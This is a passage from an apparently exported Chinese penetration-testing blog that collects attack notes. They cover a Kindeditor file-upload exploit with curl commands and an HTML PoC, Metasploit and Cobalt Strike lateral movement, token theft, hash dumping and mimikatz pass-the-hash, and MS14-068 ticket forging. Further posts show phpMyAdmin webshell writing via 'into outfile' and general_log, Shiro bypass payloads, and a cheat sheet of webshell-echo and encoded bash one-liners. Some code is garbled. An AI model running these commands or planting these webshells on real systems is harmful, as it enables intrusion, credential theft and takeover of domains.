true 可以看到一些泄露的数据，假如这是被攻击端正在输入一些私密的数据，我们就有可能获取到这些数据了。","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"openssl","slug":"openssl","permalink":"http://example.com/tags/openssl/"}]},{"title":"wpscan学习使用","slug":"wpscan学习使用","date":"2022-05-25T02:40:57.000Z","updated":"2022-05-25T05:31:12.709Z","comments":true,"path":"2022/05/25/wpscan学习使用/","permalink":"http://example.com/2022/05/25/wpscan%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/","excerpt":"","text":"wpscan学习使用1234wpscan --update 更新漏洞库--url | -u &lt;target url&gt; 要扫描的`WordPress`站点.--force | -f 不检查网站运行的是不是`WordPress`--enumerate | -e [option(s)] 枚举 （1） 扫描wordpress用户wpscan –url http://www.xxxxx.xxx/ –enumerate u （2）扫描主题wpscan –url http://www.xxxxx.xxx/ –enumerate t （3）扫描主题中的漏洞wpscan –url http://www.xxxxx.xxx/ –enumerate vt （4）扫描插件wpscan –url http://www.xxxxx.xxx/ –enumerate p （5）扫描插件中的漏洞wpscan –url http://www.xxxxx.xxx/ –enumerate vp （6）使用WPScan进行暴力破解wpscan –url http://www.xxxxx.xxx/ -e u –wordlist &#x2F;root&#x2F;桌面&#x2F;password.txt -P -U 后面的参数最好使用文件的绝对路径wpscan –url http://www.xxxxx.xxx/ &#x2F;home&#x2F;&#x2F;passwords.txt -U &#x2F;home&#x2F;username.txt （7）api token使用wpscan –url https://www.xxxxx.xxx/ –disable-tls-checks –api-token +获取到的token （8）https 情况下-disable-tls-checks #禁用SSL&#x2F;TLS证书验证。 wpscan –url https://www.xxxxx.xxx/ –enumerate vt –disable-tls-checks","categories":[],"tags":[{"name":"wpscan","slug":"wpscan","permalink":"http://example.com/tags/wpscan/"}]},{"title":"（CVE-2017-1002024）Kindeditor <=4.1.11 上传漏洞","slug":"（CVE-2017-1002024）Kindeditor-4-1-11-上传漏洞","date":"2022-05-25T02:01:52.000Z","updated":"2022-05-25T05:31:12.710Z","comments":true,"path":"2022/05/25/（CVE-2017-1002024）Kindeditor-4-1-11-上传漏洞/","permalink":"http://example.com/2022/05/25/%EF%BC%88CVE-2017-1002024%EF%BC%89Kindeditor-4-1-11-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"（CVE-2017-1002024）Kindeditor &lt;&#x3D;4.1.11 上传漏洞一、漏洞简介漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php&#x2F;asp&#x2F;jsp&#x2F;asp.net,漏洞存在于小于等于kindeditor4.1.11编辑器中 二、漏洞影响Kindeditor &lt;&#x3D;4.1.11 三、复现过程1234567curl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/php/upload_json.php?dir=filecurl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=filecurl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=filecurl -F&quot;imgFile=@a.html&quot; http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file ```返回值为路径 json文件地址 1234567/asp/upload_json.asp/asp.net/upload_json.ashx/jsp/upload_json.jsp/php/upload_json.php 上传路径 1234567kindeditor/asp/upload_json.asp?dir=filekindeditor/asp.net/upload_json.ashx?dir=filekindeditor/jsp/upload_json.jsp?dir=filekindeditor/php/upload_json.php?dir=file 查看版本信息 1http://www.0-sec.org/kindeditor//kindeditor.js 构造poc1234567891011&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;form name=&quot;form&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;https://xxxxxxxxxxxx/static/school/tool/kindeditor/php/upload_json.php?dir=file&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;imgFile&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 正确的回显 错误的回显","categories":[],"tags":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/tags/CVE/"},{"name":"Kindeditor","slug":"Kindeditor","permalink":"http://example.com/tags/Kindeditor/"}]},{"title":"beef安装使用","slug":"beef安装使用","date":"2022-05-23T04:44:33.000Z","updated":"2022-05-25T05:31:12.708Z","comments":true,"path":"2022/05/23/beef安装使用/","permalink":"http://example.com/2022/05/23/beef%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/","excerpt":"","text":"安装 1apt-get install beef-xss 启动 cd &#x2F;usr&#x2F;share&#x2F;beef-xss","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"},{"name":"beef","slug":"beef","permalink":"http://example.com/tags/beef/"}]},{"title":"内网渗透学习笔记","slug":"内网渗透学习笔记","date":"2022-05-12T12:45:45.000Z","updated":"2022-05-16T03:21:48.483Z","comments":true,"path":"2022/05/12/内网渗透学习笔记/","permalink":"http://example.com/2022/05/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"map 192.168.44.133 –script vuln 令牌窃取提权123456meterpreter &gt; load incognito //加载incognitometerpreter &gt; getuid //查看当前tokenmeterpreter &gt; list_tokens -u //列出可用tokenmeterpreter &gt; impersonate_token &quot;NT AUTHORITY\\\\SYSTEM&quot; //token窃取，格式为impersonate_token&quot;主机名\\\\用户名&quot;meterpreter &gt; getuid //查看当前tokenmeterpreter &gt; rev2self //返回之前的token 关闭防火墙 netsh advfirewall set allprofiles state off 1.导出hash 12run hashdump run windows/gather/smart_hashdump 2：加载 kiwi模块 12load kiwicreds_all 3.内网漫游 MSF搭建socks代理 · 添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机 · 添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务 注：添加路由一定要在挂代理之前，因为代理需要用到路由功能 route add 0.0.0.0 0.0.0.0 sessions_id route pint 添加socks代理 判断蜜罐123查看监听当前目录: ls判断靶机是否进入蜜罐：run post/windows/gather/checkvm列举安装程序：run post/windows/gather/enum_applications 域信息收集shell中运行chcp 65001 解决乱码 12345678910111213net view #查看局域网内其他主机名net config Workstation #查看计算机名、全名、用户名、系统版本、工作站、域、登录域net user #查看本机用户列表net user /domain #查看域用户net localgroup administrators #查看本地管理员组（通常会有域用户）net view /domain #查看有几个域net user 用户名 /domain #获取指定域用户的信息net group /domain#查看域里面的工作组，查看把用户分了多少组（域控上操作）net group 组名 /domain #查看域中某工作组net group &quot;domain admins&quot; /domain #查看域管理员的名字net group &quot;domain computers&quot; /domain #查看域中的其他主机名net group &quot;doamin controllers&quot; /domain #查看域控制器主机名 内网主机信息收集（内网横向渗透）添加路由后进行扫描 123456MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了。#加载MSFautoroute模块，探测当前机器所有网段信息meterpreter &gt; run post/multi/manage/autoroute#添加目标内网路由meterpreter &gt; run post/multi/manage/autoroute SUBNET=192.168.44.129 ACTION=ADD 内网存活主机探测12后渗透阶段之基于MSF的内网主机探测auxiliary/scanner/discovery/udp_sweep #基于udp协议发现内网存活主机auxiliary/scanner/discovery/udp_probe #基于udp协议发现内网存活主机auxiliary/scanner/netbios/nbname #基于netbios协议发现内网存活主机 内网存活主机端口扫描12345678910111213auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描(默认扫描1-10000)auxiliary/scanner/ftp/ftp_version 发现内网ftp服务，基于默认21端口auxiliary/scanner/ssh/ssh_version 内网ssh服务，基于默认22端口auxiliary/scanner/telnet/telnet_version 内网telnet服务，基于默认23端口auxiliary/scanner/dns/dns_amp 发现dns服务，基于默认53端口auxiliary/scanner/http/http_version 发现内网http服务，基于默认80端口auxiliary/scanner/http/title 探测内网http服务的标题auxiliary/scanner/smb/smb_version 内网smb服务，基于默认的445端口auxiliary/scanner/mssql/mssql_schemadump 内网SQLServer服务,基于默认的1433端口auxiliary/scanner/oracle/oracle_hashdump 内网oracle服务,基于默认的1521端口auxiliary/scanner/mysql/mysql_version 内网mysql服务，基于默认3306端口auxiliary/scanner/rdp/rdp_scanner 内网RDP服务，基于默认3389端口auxiliary/scanner/redis/redis_server 内网Redis服务，基于默认6379端口auxiliary/scanner/db2/db2_version 探测内网的db2服务，基于默认的50000端口auxiliary/scanner/netbios/nbname内网主机的netbios名字 123456781. 内网横向探测 获取到一个 cs 的 beacon 后可以目标内网情况和端口开放情况，在 beacon 上右键 -&gt; 目 标 -&gt; 选择 net view 或者 port scan： 可以在菜单栏中，view视窗的targets选项中查看2. 用 cs 的 hashdump 读内存密码：hashdump，用 mimikatz 读注册表密码：logonpasswords。获取相应账户凭证或者： 右键-&gt;Access-&gt;Dump Hashes（需要Administrator权限） 右键-&gt;Access-&gt;Run Mimikatz 可以在凭证栏中查看获取的凭证 内网横向渗透攻击1.MS17-010永恒之蓝1234search ms17-010注意这里的payload必须设置为正向连接 bind_tcpuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp 2.CVE-2019-0708windows RDP协议的漏洞 该漏洞成功率不高，而且极有可能把目标机打成蓝屏 3.psexec攻击获得了域管理员 administrator 的账号密码 使用该域管理员账号密码利用 psexec 登录域内任何一台开启了admin$共享(该共享默认开启) 的主机。 注：由于提示需要修改密码，所以已将 god&#x2F;administrator 的密码改为 Password@ 。 psexec.exe \\192.168.52.138 -u god\\administrator -p Password@ cmd psexec 传递12345678910psexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet 服务的时候返回一个半交互的命令行原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec 建立连接之后对方机器上会被安装一个服务。获取凭据后对目标网段进行端口存活探测，因为是 psexec 传递登录，这里仅需探测445端口命令：portscan ip网段 端口 扫描协议（arp、icmp、none） 线程例如：portscan 10.10.10.0/24 445 arp 200 IPC连接建立IPC$连接上传木马 建立后可以访问目标机器的文件(上传、下载)，也可以在目标机器上运行命令。上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。 常用命令: 1234net use \\\\ip\\ipc$ pawword /user:username 建立IPC连接copy hacker.exe \\\\10.10.10.10\\C$\\windows\\temp 复制本地文件到目标服务器copy \\\\10.10.10.10\\C$\\windows\\temp\\hash.txt 复制目标服务器文件到本地 wmic命令执行木马1wmic /node:10.10.10.10 /user:用户名 /password:密码 process call create &quot;目标机中的木马路径&quot; 4.哈希传递攻击只有获得了域管理员的哈希才可以攻击。没有得到明文密码 1234567【哈希传递攻击】在 kerberos、NTLM 认证过程的关键，首先就是基于用户密码 Hash 的加密，所以在域渗透中，无法破解用户密码 Hash 的情况下，也可以直接利用 Hash 来完成认证，达到攻击的目的，这就是 hash 传递攻击（Pass The Hash，简称 PTH）。如果内网主机的本地管理员账户密码相同，那么可以通过 PTH 远程登录到任意一台主机，操作简单、威力无穷。在域环境中，利用哈希传递攻击的渗透方式往往是这样的： 1.获得一台域主机的权限，Dump 内存获得该主机的用户密码 Hash 值； 2.通过哈希传递攻击尝试登录其他主机； 3.继续搜集 Hash 并尝试远程登录，直到获得域管理员账户 Hash，登录域控，最终成功控制整个域。 1sekurlsa::pth /user:administrator /domain: &quot;god.org&quot; /ntlm:c456c606a647ef44b646c44a227917a4 5.MS14-068用于当我们获得了普通域用户的哈希,域控存在MS14-068漏洞 先获取需要利用的域用户的SID值 whoami &#x2F;all 1234567#生成票据TGT_administrator@god.org.ccacheMS14-068.exe -u administrator@god.org -p Password@ -s S-1-5-21-2952760202-1353902439-2381784089-500 -d 192.168.52.138 #MS14-068.exe -u 域用户@dog.org -p 域用户密码 -s 域用户的SID -d 域控ip#在mimikatz中导入票据kerberos::ptc %uA0TGT_administrator@god.org.ccache的路径然后再打开一个cmd窗口尝试访问域控dir \\\\192.168.52.138\\c$ SMB Beacon和psexec传递（msf中的hash传递攻击）123456789101112131415 - 在探测到其他两个内网机器开了445端口的前提下，可以使用SMB beacon获取。相当于在msf里面使用永恒之蓝获取shell。有两种方法- 直接派生，新建一个listener，pyload设置为beacon_smb 在已有的 Beacon 上右键 Spawn(生成会话 / 派生)，选择创建的 smb beacon 的 listerner： 选择后会反弹一个子会话，在 external 的 ip 后面会有一个链接的小图标： 这就是派生的 SMB Beacon，当前没有连接，可以在主 Beacon 上用 link host 连接它，或者unlink host 断开 就是说通过之前的beacon为跳板通过SMB去连接新beacon获取权限shell 可以在视图界面查看图形化连接情况- 前面横向探测已经获取到内网内的其他 Targets 以及读取到的凭证信息，尝试使用 psexec 模块登录其他主机，右键选择一台非域控主机 ROOT-TVI862UBEH 的 psexec 模块：- 在弹出的窗口中选择使用 god.org 的 Administrator 的凭证信息，监听器选择之前创建的smb beacon，会话也选择对应的 smb beacon 的会话：- 成功上线，并返回新的beacon","categories":[],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"msf和cs联动","slug":"msf和cs联动","date":"2022-05-12T12:29:34.000Z","updated":"2022-05-13T13:37:13.301Z","comments":true,"path":"2022/05/12/msf和cs联动/","permalink":"http://example.com/2022/05/12/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/","excerpt":"","text":"cs传shell给msf1.msf 1234use exploit/multi/handlerset payload windows/meterpreter/reverse_httpset lhost 192.168.110.130 set lport 4444 2.cs创建监听器，名字为msf 选择Foreign http 3.cs执行监听器 spawn msf msf传shell给cs cs创建监听器 ​ 选择的是http方式连接 msf派生shell ​ 先把会话放到后台，设置如下。因为cs上设置的为http连接，所以我们下边payload也要对应的设置为reverse_tcp 12345678910#派生一个新的shell给cs，那么msf里面用到的exploit是use exploit/windows/local/payload_inject set payload windows/meterpreter/reverse_http#禁止产生一个新的handlerset disablepayloadhandler true#设置ip端口为cs监听的set LHOST IPset LPORT 端口set session 3run","categories":[],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"cs","slug":"cs","permalink":"http://example.com/tags/cs/"}]},{"title":"kali重新获取ip","slug":"kali重新获取ip","date":"2022-05-12T11:58:31.000Z","updated":"2022-05-13T13:37:13.303Z","comments":true,"path":"2022/05/12/kali重新获取ip/","permalink":"http://example.com/2022/05/12/kali%E9%87%8D%E6%96%B0%E8%8E%B7%E5%8F%96ip/","excerpt":"","text":"1234释放原有ip：#dhclient -r获取新的ip：#dhclient eth0查看ip： # ifconfig查看ip详细信息：#cat /var/lib/dhcp/dhclient.leases","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"http://example.com/tags/kali/"}]},{"title":"phpMyAdmin后台getshell学习笔记","slug":"phpMyAdmin后台getshell学习笔记","date":"2022-05-11T11:56:35.000Z","updated":"2022-05-13T13:37:13.304Z","comments":true,"path":"2022/05/11/phpMyAdmin后台getshell学习笔记/","permalink":"http://example.com/2022/05/11/phpMyAdmin%E5%90%8E%E5%8F%B0getshell%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"PhpMyAdmin后台getshell学习笔记1.into outfile导入木马 首先需要确认网站的绝对路径 1select @@basedir; select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;web路径&#39;; 1234567891011121314151617181920212223 **mysql**高版本中secure_file_pirv会对读写进行限制 ~~~sql show global variables like &#x27;%secure%&#x27;; ~~~ 当`secure_file_priv`为NULL时，表示限制Mysql不允许导入导出。 要想成功，则需要在Mysql文件夹下修改`my.ini` 文件，在[mysqld]内加入`secure_file_priv =&quot;&quot;` 即可。## 2.利用Mysql日志文件mysql5.0以上会创建日志文件1. **general_log** 指的是日志保存状态，ON代表开启 OFF代表关闭；2. **general_log_file** 指的是日志的保存路径。 查看日志状态： ~~~~sql show variables like &#x27;%general%&#x27;; 当开启general时，**所执行的sql语句都会出现在`log`文件**。 修改`general_log_file`的值，执行的sql语句就会对应生成，进而getshell。 需要注意**路径斜杠的方向** 12set global general_log = &#x27;on&#x27;set global general_log_file = &#x27;C:/phpStudy/www/hack.php&#x27; 再次执行，getshell 1select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;","categories":[],"tags":[{"name":"PhpMyAdmin","slug":"PhpMyAdmin","permalink":"http://example.com/tags/PhpMyAdmin/"}]},{"title":"centos安装msf","slug":"centos安装msf","date":"2022-05-08T12:06:54.000Z","updated":"2022-05-09T11:05:53.444Z","comments":true,"path":"2022/05/08/centos安装msf/","permalink":"http://example.com/2022/05/08/centos%E5%AE%89%E8%A3%85msf/","excerpt":"","text":"centos安装msf下载包 1wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run 权限配置 1chmod +x metasploit-latest-linux-x64-installer.run 运行这个文件./metasploit-latest-linux-x64-installer.run 之后基本回车就可以，有选择y&#x2F;n的选y。","categories":[],"tags":[{"name":"centos","slug":"centos","permalink":"http://example.com/tags/centos/"},{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"}]},{"title":"完美解决centos8 appstream问题","slug":"完美解决centos8-appstream问题","date":"2022-05-06T10:57:55.000Z","updated":"2022-05-09T11:05:53.444Z","comments":true,"path":"2022/05/06/完美解决centos8-appstream问题/","permalink":"http://example.com/2022/05/06/%E5%AE%8C%E7%BE%8E%E8%A7%A3%E5%86%B3centos8-appstream%E9%97%AE%E9%A2%98/","excerpt":"","text":"【Centos8】Linux 为 repo ‘AppStream‘ 下载元数据失败、Could not resolve host: mirrors.cloud.aliyuncs.com解决问题： 运行以下命令备份之前的repo文件。 1rename &#x27;.repo&#x27; &#x27;.repo.bak&#x27; /etc/yum.repos.d/*.repo 运行以下命令下载最新的repo文件 12wget https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo -O /etc/yum.repos.d/Centos-vault-8.5.2111.repowget https://mirrors.aliyun.com/repo/epel-archive-8.repo -O /etc/yum.repos.d/epel-archive-8.repo 运行以下命令替换repo文件中的链接，就是这一步出错了 官方的 12sed -i &#x27;s/mirrors.cloud.aliyuncs.com/url_tmp/g&#x27; /etc/yum.repos.d/Centos-vault-8.5.2111.repo &amp;&amp; sed -i &#x27;s/mirrors.aliyun.com/mirrors.cloud.aliyuncs.com/g&#x27; /etc/yum.repos.d/Centos-vault-8.5.2111.repo &amp;&amp; sed -i &#x27;s/url_tmp/mirrors.aliyun.com/g&#x27; /etc/yum.repos.d/Centos-vault-8.5.2111.reposed -i &#x27;s/mirrors.aliyun.com/mirrors.cloud.aliyuncs.com/g&#x27; /etc/yum.repos.d/epel-archive-8.repo http://mirrors.cloud.aliyuncs.com需要替换为http://mirrors.aliyun.com，但是官方提供的命令没替换完，如果有执行官方提供的命令还是不行的话执行下面的命令： 12sed -i &#x27;s/mirrors.cloud.aliyuncs.com/mirrors.aliyun.com/g&#x27; /etc/yum.repos.d/Centos-vault-8.5.2111.repo sed -i &#x27;s/mirrors.cloud.aliyuncs.com/mirrors.aliyun.com/g&#x27; /etc/yum.repos.d/epel-archive-8.repo 运行以下命令重新创建缓存 yum clean all &amp;&amp; yum makecache 执行成果，yum install也可以正常使用了","categories":[],"tags":[{"name":"centos8","slug":"centos8","permalink":"http://example.com/tags/centos8/"}]},{"title":"通用型漏洞学习笔记","slug":"通用型漏洞学习笔记","date":"2022-04-28T01:17:43.000Z","updated":"2022-05-09T11:05:53.454Z","comments":true,"path":"2022/04/28/通用型漏洞学习笔记/","permalink":"http://example.com/2022/04/28/%E9%80%9A%E7%94%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"通用型漏洞学习笔记1.常见的web中间件1iis，shiro，tomcat，apache，strust2,weblogic,jboss 2.shiro漏洞调试环境搭建123shiro-coreshiro-spring-boot-starter 插件12https://github.com/pmiaowu/BurpShiroPassiveScanhttps://github.com/j1anFen/shiro_attack RCE流程12341.fetch rememberMe cookie2.base64-decode3.AES解密（硬编码）4.反序列化 1234567891011cve-2016-4437 # shrio rememberMe反序列化漏洞cve-2016-4437 # shiro Padding oracle attackcve-2016-6802cve-2020-1957cve-2020-11989 # apache shrio 身份验证绕过漏洞cve-2020-13933cve-2020-17523CVE-2019-12422 Shiro &lt;=1.4.2 Padding Oracle Attack RCE (Shiro-721)https://github.com/feihong-cs/ShiroExploit-Deprecated apache shiro 反序列化漏洞分为两种：shiro-550、shiro-721 123456shiro-550 框架提供了记住密码的功能，用户登录成功后会生成经过加密并编码的cookieshiro-721，由于apache shrio cookie中通过aes-128-cbc模式加密的rememberme字段存在问题 影响Apache Shiro 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1版本。  该漏洞需要登录后获取到合法的Cookie:rememberMe=XXX后才可以进行利用，不需要知道服务端密钥 shrio721 rce 123456• 输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。• 使用RememberMe cookie作为Padding Oracle Attack的前缀。• 加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。 • 请求带有新的RememberMe cookie的网站，以执行反序列化攻击。• 攻击者无需知道RememberMe加密的密码密钥。 cve-2016-4437（cve-550）1234567891011121314版本影响：(Shiro&lt;1.4.2 or Shiro&gt;1.4.2)Apache Shiro框架提供RememberMe，用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。因为在反序列化时,不会对其进行过滤,所以如果传入恶意代码将会造成安全问题。在 1.2.4 版本前,shiro中使用默认ASE秘钥（CBC模式）,Key: kPH+bIxk5D2deZiIxcaaaA==,可以直接反序列化执行恶意代码。在1.2.4之后,修复为自定义ASE秘钥（CBC模式）,需要获取到Key才可以进行渗透，通过采集获取常用的github中常用的key值。在1.4.2之后,使用了新的GCM模式进行AES加密,需要使用新的加密算法，并获取到Key才可以进行渗透。漏洞利用需要可用的AES密钥。 cve-2020-195712Shiro 身份验证绕过原理：利用shiro解析uri和spring解析uri之间存在差异来绕过身份验证 漏洞利用 123456789101112131415161718192021222324252627282930311、Shiro&lt;1.5.2 权限绕过POC【URL中加/..;/】目标访问地址【/xxx/hello/aaaa】最终发起请求【/xxx/..;/hello/aaaa】2、CVE-2020-11989 Shiro&lt;1.5.3 权限绕过POC1【URL中加/;/】目标访问地址【/xxx/hello/aaaa】最终发起请求【/;/xxx/hello/aaaa】POC2【将URL中的/二次编码为%25%32%66】目标访问地址【/xxx/hello/aaaa】最终发起请求【/xxx/hello%25%32%66aaaa】漏洞原理：• 当将Apache Shiro与Spring动态控制器一起使用时，访问/;/shiro/admin/page , 就能直接绕过Shiro权限验证影响版本：• Shiro &lt; 1.5.3• 应用不能部署根目录root目录下• Spring控制器中没有另外的权限校验代码3、CVE-2020-13933 Shiro&lt;1.6.0 权限绕过POC【URL加编码后的;】目标访问地址【/xxx/hello/aaaa】最终发起请求【/xxx/hello/%3baaaa】4、CVE-2020-17523 Shiro&lt;1.7.1 权限绕过POC 【URL中加空字符,如%20】目标访问地址【/xxx/hello/aaaa】最终发起请求【/xxx/hello/%20aaaa】 cve-2016-680212345678 漏洞原理：• shiro在路径控制的时候。未能对传入的url编码进行decode解码，导致攻击者可以绕过过滤器，访问被过滤的路径。 影响版本：• shiro &lt; 1.3.2 测试方案：curl --path-as-is -v &quot;192.168.18.155:8080/x/../samples-web1.2.4/account/index.jsp&quot; 修复123添加一个一个InvalidRequestFilter类，该类从全局上对分号，反斜杠和非ASCII字符进行了过滤 123456789101112publie class InvaliaRequestFilter extends AccessCentroLFilter &#123;private static final List&lt;string&gt; SENICOLON = Collection , unmodlfiblelist(Arrays.astList(“;“, “%3b”, “%38”)); private static final List&lt;string&gt; BACKSLASH = Colletiens. unnodlfoblulst(Arrays.asList(“\\\\”,”%5c&quot;, “%5C”)); private boolean blockSemicolon . true; private beolean blockBackslash . true; private boolean blocklonAscll . true ; @Override pretected boolean isAccesAlLowed(ServletReqvest request, ServletResponse response, object appedvatue) throus Exce string uri . nebutila. terttp(request).getRequestUR(); return ! containsSeniceLen(ur1) &amp;&amp; ! containsBocksLash(uri) &amp;&amp; ! containshanAseilcharacter (uri); shrio复现登录，不勾选rememberme 勾选rememberMe 工具利用 3.Apache ssl远程命令执行漏洞4.tomcat cve-2017-12615","categories":[],"tags":[]},{"title":"windows下go get失败问题解决","slug":"windows下go-get失败问题解决","date":"2022-04-23T03:32:56.000Z","updated":"2022-05-09T11:05:53.444Z","comments":true,"path":"2022/04/23/windows下go-get失败问题解决/","permalink":"http://example.com/2022/04/23/windows%E4%B8%8Bgo-get%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/","excerpt":"","text":"使用go get 命令总是报错，发现在国内需要使用需要访问外网 原因是缺少golang.org&#x2F;x&#x2F;net 的依赖包，github已经有托管依赖包，安装下载其依赖包就能解决了： 1234#%GOPATH%---是安装go时设置的变量名称，GOPATH路径mkdir -p %GOPATH%\\src\\golang.org\\x cd %GOPATH%\\src\\golang.org\\x git clone https://github.com/golang/net.git 完成后可以使用go get 命令试一下","categories":[],"tags":[{"name":"-go","slug":"go","permalink":"http://example.com/tags/go/"}]},{"title":"渗透常用命令收集","slug":"渗透常用命令收集","date":"2022-04-23T01:55:02.000Z","updated":"2022-05-09T11:05:53.454Z","comments":true,"path":"2022/04/23/渗透常用命令收集/","permalink":"http://example.com/2022/04/23/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","excerpt":"","text":"command收集渗透中会用到的常用命令 command nmap 存活主机 bypass gobuster dirsearch nbtscan 代理工具 ssh grep mysql sqlmap hydra medusa python交互shell 无交互添加用户 windows 防火墙 frp常用配置 删rdp日志 开3389 文件查找 powershell文件下载 certutil.exe下载 bitsadmin windows信息收集常用命令 at&amp;schtasks&amp;sc横向 impacket包横向命令 反弹shell nc bash perl python php ruby nc java lua powershell 加密shell msf大全 安装 Meterpreter基本命令 基本系统命令 文件系统命令 网络命令 信息收集 提权 获取凭证 假冒令牌 植入后门 cs大全 java命令执行http://www.jackson-t.ca/runtime-exec-payloads.html 1bash -c &#123;echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 写shell在windows中，批处理需要转义字符主要有 “&amp;”，“|”，“&lt;”，“&gt;”等等，转义字符为”^”在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\\47即可。windows命令行最大长度为8191,16进制长度是113898。echo写文件时注意长度。 方法1 1set /p=qaxnb&lt;nul&gt;d:\\1d13.txt 方法2 1echo qaxnb&gt;1we.txt 追加内容 1echo qaxnb&gt;&gt;1we.txt 不换行追加 1set /p=&quot;121d2&quot;&gt;&gt;a.txt 规避空格 123echo.123&gt;&gt;a.txtecho,123&gt;&gt;a.txttype;a.txt 写特殊字符很多的文件，可以用certutil编码再还原。如下还原 12certutil -f -decode 111.txt C:\\\\111.jspcertutil -decodehex 111.txt C:\\\\111.jsp linux下base64 1echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php php的 1echo \\&lt;\\?php eval\\(\\@\\$_POST\\[1\\]\\)\\; \\?\\&gt; &gt;1.php 绕过空格 1234567&gt; &lt; &lt;&gt; 重定向符%09(需要php环境)$&#123;IFS&#125;$IFS$9&#123;cat,flag.php&#125;%20%09 nmap1nmap -sn 10.11.1.0/24 1nmap -sV -p- 10.11.1.0 1nmap 10.11.1.0 --script vuln 1nmap -p445 10.11.1.0 --script smb-vuln-ms17-010 1nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG tmp -iL ip.txt | awk &#x27;&#123;print $5&#125;&#x27; | grep -v &quot;latency).&quot; &gt;ok_ip.txt 端口列表12345622,23,135,445,389,3389,80,443,8080,7001,3306,1433,1521,6379,27017,2375,5900,5432,489921-23,80-90,135,137,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2375,2376,2601,2604,3128,3306,3311,3312,3389,4440,4848,5001,5432,5560,5900-5902,6082,6379,7001-7010,7778,8009,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,51111,50030,5006020-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,